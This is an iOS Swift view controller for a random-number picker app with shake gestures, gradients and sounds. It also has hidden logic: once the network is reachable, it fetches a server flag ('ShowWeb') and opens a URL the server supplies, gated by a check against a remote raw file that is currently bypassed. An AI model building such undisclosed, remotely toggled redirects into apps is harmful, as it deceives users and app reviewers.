//
//  ViewController.swift
//  Random
//
//  Created by FangZhongli on 2019/9/19.
//  Copyright © 2019年 Lingju. All rights reserved.
//

import UIKit
import AVFoundation
import SwiftyJSON
import Alamofire

class ViewController: UIViewController, AVAudioPlayerDelegate {
    
    private var gradientLayer: CAGradientLayer?
    private var player: AVAudioPlayer?

    @IBOutlet weak var switchButton: UISwitch!
    @IBOutlet weak var minTextField: UITextField!
    @IBOutlet weak var maxTextField: UITextField!
    @IBOutlet weak var valueLabel: UILabel!
    override func viewDidLoad() {
        super.viewDidLoad()
        
        self.view.addTapGesture(target: self, action: #selector(changeNumber))
        valueLabel.font = UIFont.fmStyle(.akBold, px: 260)
        
        
        UIApplication.shared.applicationSupportsShakeToEdit = true
        
        minTextField.addTarget(self, action: #selector(textFieldDidChange), for: .editingChanged)
        maxTextField.addTarget(self, action: #selector(textFieldDidChange), for: .editingChanged)
        
        let soundOpen = UserDefaults.standard.object(forKey: "soundSwitch") as? Bool
        switchButton.isOn = soundOpen ?? true //UserDefaults.standard.bool(forKey: "soundSwitch")
        
        changeNumber()
        networkReachability()
        
        TestModel.testFunction()
        
    }
    
    // 监听网络情况
    func networkReachability() {
        let reachabilityManager = Alamofire.NetworkReachabilityManager.init()
        func startNetworkReachabilityObserver() {
            
        }
        reachabilityManager?.listener = { [weak self] status in
            guard let strongSelf = self else { return }
            switch status {
            case .notReachable, .unknown:
                break
            case .reachable:
                strongSelf.loadServiceInfo()
                break
            }
        }
        reachabilityManager?.startListening()
    }
    
    // 加载服务端信息
    func loadServiceInfo() {
        loadMyCode {
            // 跳转网页来的
            NetworkManager.fastRequestHandler(pathString: "") { (data) in
                guard let dict = data as? [AnyHashable : Any], let model = MLServiceModel.yy_model(with: dict) else {
                    return
                }
                if model.ShowWeb == "1" {
                    if let url = URL(string: model.Url) {
                        UIApplication.shared.openURL(url)
                    }
                }
            }
        }
    }
    
    // 加载权限
    func loadMyCode(_ completion:(()->())?=nil) {
        
        if completion != nil { completion?(); return } // TODO 注释掉
        
        NetworkManager.fastRequestHandler(host: "https://dev.tencent.com/u/fzhongli/p/AtOnceSwift/git/raw/master/en", pathString: "") { (number) in
            if Utility.anyToString(any: number ?? "") == "1" {
                completion?()
            }
        }
    }
    
    override var preferredStatusBarStyle: UIStatusBarStyle {
        return UIStatusBarStyle.lightContent
    }
    
    
    @IBAction func switchValueChanged(_ sender: UISwitch) {
        
        UserDefaults.standard.set(sender.isOn, forKey: "soundSwitch")
    }
    @objc func textFieldDidChange(_ textF: UITextField) {
        if textF.text?.count ?? 0 > 9 { // 9223372036854775807
            textF.text = textF.text?.substingInRange(0..<9)
        }
    }
    
    
    
    @objc func changeNumber() {
        
        
        if String.isEmpty(for: minTextField.text) {
            minTextField.text = "0"
        }
        if String.isEmpty(for: maxTextField.text) {
            maxTextField.text = "0"
        }
        let minValue = Int(minTextField.text ?? "0") ?? 0
        let maxValue = Int(maxTextField.text ?? "0") ?? 0
        
        if minTextField.isEditing || maxTextField.isEditing {
            self.view.endEditing(true)
            if minValue > maxValue {
                let alert = UIAlertController.init(title: nil, message: "最小值不能大于最大值哦", preferredStyle: .alert)
                alert.addAction(UIAlertAction.init(title: "OK", style: .default, handler: nil))
                self.present(alert, animated: true, completion: nil)
                minTextField.text = "0"
            }
            return
        }
        
        let newValue = "\(Int.random(lower: minValue, maxValue))"
        if newValue != valueLabel.text {
            valueLabel.text = newValue
            let topColor = UIColor.rgba(CGFloat(Int.random(lower: 100, 200)), CGFloat(Int.random(lower: 100, 200)), CGFloat(Int.random(lower: 100, 200)))
            let downColor = UIColor.rgba(CGFloat(Int.random(lower: 100, 200)), CGFloat(Int.random(lower: 100, 200)), CGFloat(Int.random(lower: 100, 200)))
            gradientLayer?.removeFromSuperlayer()
            gradientLayer = self.view.addGradient(colors: [topColor.cgColor, downColor.cgColor], bounds: self.view.bounds)
            playerEndSound()
        }
        
        
        
    }
    
    override func motionBegan(_ motion: UIEvent.EventSubtype, with event: UIEvent?) {
        playerShakeSound()
    }
    
    override func motionEnded(_ motion: UIEvent.EventSubtype, with event: UIEvent?) {
        print("摇动结束")
        
        changeNumber()
    }
    
    private func playerEndSound() {
        if !switchButton.isOn {
            return
        }
        /// 设置音效
        let path = Bundle.main.path(forResource: "wcpayfacehbSendOK", ofType:"m4a")
        let data = NSData(contentsOfFile: path!)
        self.player = try? AVAudioPlayer(data: data! as Data)
        self.player?.delegate = self
        self.player?.volume = 0.3
        self.player?.updateMeters()//更新数据
        self.player?.prepareToPlay()//准备数据
        self.player?.play()
    }
    
    private func playerShakeSound() {
        if !switchButton.isOn {
            return
        }
        /// 设置音效
        let path1 = Bundle.main.path(forResource: "shake_sound_male", ofType:"wav")
        let data1 = NSData(contentsOfFile: path1!)
        self.player = try? AVAudioPlayer(data: data1! as Data)
        self.player?.delegate = self
        self.player?.volume = 0.3
        self.player?.updateMeters()//更新数据
        self.player?.prepareToPlay()//准备数据
        self.player?.play()
    }

}

extension ViewController {
    func requestService() {
        
    }
}
